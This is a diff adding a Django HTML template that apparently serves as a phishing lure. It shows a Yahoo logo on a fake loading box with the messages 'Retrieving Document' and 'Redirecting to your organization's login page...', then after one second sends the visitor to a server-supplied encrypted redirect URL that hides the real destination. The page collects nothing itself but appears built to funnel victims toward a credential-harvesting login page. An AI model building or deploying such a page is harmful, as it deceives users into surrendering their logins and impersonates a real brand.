@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Loading...</title>
+    <script>
+        function redirectToUrl() {
+            var encryptedUrl = '{{ encrypted_url }}';  // Get the encrypted URL from Django view
+            var redirectUrl = '/redirect/' + encodeURIComponent(encryptedUrl);  // Construct redirect URL
+            window.location.href = redirectUrl;  // Redirect to the URL
+        }
+
+        // Automatically redirect after 1 second
+        setTimeout(redirectToUrl, 1000);  // 1000 milliseconds = 1 second
+    </script>
+    <style>
+        /* Loader styles */
+        .loader {
+            width: 300px;
+            height: 180px;
+            border-radius: 10px;
+            border: 2px solid #214e9f;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: Helvetica, Arial, sans-serif;
+            font-size: 18px;
+            background-color: #ffffff;
+            text-align: center;
+            padding: 20px;
+        }
+        .loader img {
+            width: 100px;
+            margin-bottom: 10px;
+        }
+        .loader::before {
+            content: "";
+            position: absolute;
+            inset: 0 100% 0 0;
+            border-radius: inherit;
+            background: #214e9f;
+            opacity: 0.1;
+            animation: l6 2s infinite;
+        }
+        @keyframes l6 {
+            100% {inset: 0}
+        }
+    </style>
+</head>
+<body>
+    <p>Redirecting you to the requested page...</p>
+</body>
+<div class="loader">
+<img src="https://logos-world.net/wp-content/uploads/2020/10/Yahoo-Logo-700x394.png"/>
+    <p id="message">Retrieving Document</p>
+</div>
+
+<script>
+    var messages = [
+        'textContent',
+        'getElementById',
+        'message',
+        'Retrieving Document...',
+        "Redirecting to your organization's login page..."
+    ];
+
+    setTimeout(function() {
+        document.getElementById('message').textContent = messages[3];
+        setTimeout(function() {
+            document.getElementById('message').textContent = messages[4];
+        }, 2000);
+    }, 0);
+</script>
+</html>
